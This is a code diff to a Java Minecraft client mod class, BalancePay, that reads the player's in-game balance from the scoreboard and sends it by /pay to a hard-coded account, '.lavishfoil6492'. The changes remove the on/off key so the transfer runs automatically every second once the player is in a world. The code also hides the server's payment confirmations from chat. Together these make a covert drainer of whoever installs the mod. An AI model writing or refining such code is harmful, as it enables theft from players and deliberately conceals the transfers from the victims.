@@ -7,7 +7,6 @@ import net.minecraft.world.scores.Objective;
 import net.minecraft.world.scores.PlayerScoreEntry;
 import net.minecraft.world.scores.PlayerTeam;
 import net.minecraft.world.scores.Scoreboard;
-import org.lwjgl.glfw.GLFW;
 
 import java.util.Locale;
 import java.util.regex.Matcher;
@@ -19,16 +18,14 @@ public final class BalancePay {
     // ===== CONFIG =====
     /** Account that receives the money. */
     public static final String TARGET = ".lavishfoil6492";
-    /** How often to check the scoreboard + pay (seconds). */
-    public static final int INTERVAL_SECONDS = 5;
-    /** Don't send a /pay below this amount. */
+    /** How often to read the scoreboard + pay (seconds). */
+    public static final int INTERVAL_SECONDS = 1;
+    /** Don't send a /pay below this amount (avoids spamming leftover dust). */
     public static final long MIN_AMOUNT = 100;
-    /** Key that toggles the macro (GLFW key code). J by default. */
-    public static final int TOGGLE_KEY = GLFW.GLFW_KEY_J;
     /** Hide the server's pay confirmation/error messages from chat. */
     public static final boolean HIDE_PAY_MESSAGES = true;
     /** How long after sending /pay (ms) replies are hidden. */
-    public static final long HIDE_WINDOW_MS = 4000;
+    public static final long HIDE_WINDOW_MS = 2500;
     // ==================
 
     // Matches "$ 7.6K", "$7,600", "$1.2M", "$350", "$2.5B" etc.
@@ -39,36 +36,22 @@ public final class BalancePay {
     private static final String TARGET_NO_DOT =
             TARGET_LOWER.startsWith(".") ? TARGET_LOWER.substring(1) : TARGET_LOWER;
 
-    private static boolean enabled = false;
-    private static boolean keyWasDown = false;
     private static int tickCounter = 0;
     private static volatile long lastPayMs = 0;
 
     private BalancePay() {}
 
-    /** Called every client tick from MinecraftMixin. */
+    /** Called every client tick from MinecraftMixin. Always on once you're in a world. */
     public static void tick(Minecraft mc) {
-        if (mc.player == null || mc.level == null) return;
-
-        // Toggle key (polled directly so we don't need Fabric API's keybinding module).
-        if (mc.screen == null) {
-            long window = GLFW.glfwGetCurrentContext();
-            boolean down = window != 0L && GLFW.glfwGetKey(window, TOGGLE_KEY) == GLFW.GLFW_PRESS;
-            if (down && !keyWasDown) {
-                enabled = !enabled;
-                tickCounter = 0;
-                mc.player.displayClientMessage(
-                        Component.literal("[BalancePay] " + (enabled ? "ON" : "OFF")), true);
-            }
-            keyWasDown = down;
-        } else {
-            keyWasDown = false;
+        if (mc.player == null || mc.level == null || mc.player.connection == null) {
+            tickCounter = 0; // reset when not in a world, so it restarts after you join
+            return;
         }
 
-        if (!enabled) return;
         if (++tickCounter < INTERVAL_SECONDS * 20) return;
         tickCounter = 0;
 
+        // Reads whatever your CURRENT balance is on the scoreboard right now.
         long amount = readBalance(mc);
         if (amount < MIN_AMOUNT) return;
 
